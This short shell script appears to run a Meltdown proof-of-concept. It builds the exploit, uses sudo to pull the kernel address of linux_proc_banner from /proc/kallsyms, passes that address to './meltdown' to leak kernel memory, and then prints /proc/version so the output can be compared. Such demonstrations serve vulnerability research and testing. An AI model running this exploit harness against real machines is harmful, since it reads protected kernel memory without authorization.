make clean
make
linux_proc_banner=$(sudo cat /proc/kallsyms | grep linux_proc_banner | sed -n -re 's/^([0-9a-f]*[1-9a-f][0-9a-f]*) .* linux_proc_banner$/\1/p')
echo $linux_proc_banner
./meltdown $linux_proc_banner 57
echo "----------------"
echo "from /proc/version:"
cat /proc/version
make clean
